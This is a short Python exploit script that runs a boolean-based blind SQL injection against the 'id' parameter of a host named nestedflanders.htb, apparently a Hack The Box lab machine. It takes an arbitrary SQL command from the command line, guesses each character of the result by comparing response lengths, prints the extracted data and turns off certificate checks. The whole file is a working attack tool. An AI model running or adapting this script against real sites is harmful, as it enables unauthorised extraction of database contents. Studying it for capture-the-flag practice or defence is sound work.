import argparse                                                                                                                                              
import requests                                                                                                                                              
import urllib3                                                                                                                                               
import sys                                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)   # disable https warnings                                                                                       
                                                                              
parser = argparse.ArgumentParser()
parser.add_argument('-c', '--command',type=str, help='sql command to inject', required=True)                                                                 
parser.add_argument('-r', '--range', type=int, help='range to scan', required=False, default=10)                                                             
args = parser.parse_args()

target = 'https://www.nestedflanders.htb/'                                    
endpoint = 'index.php?id='                                                             
                                                                              
                                       
def check_ord(i):          
    payload = f"465' and ord(substr(({args.command}),{i},1)) > \"58\" -- -"   
    r = requests.get(target + endpoint + payload, verify=False)                                                                                              
    if len(r.content) == 1227:                                                
        return True               
    else:                         
        return False          


for i in range(1, args.range):                                                
    if check_ord(i):                                                                                                                                         
        charset = 'abcdefghijklnmopqrstuvwxyz'
    else:                                                                     
        charset = '0123456789.-_'
        
    for char in charset:                                                      
        injection_str = f"465' and substr(({args.command}),{i},1) = \"{char}\" -- -"
        r = requests.get(target + endpoint + injection_str, verify=False)
        if len(r.content) == 1227:
            sys.stdout.write(char)
            sys.stdout.flush()
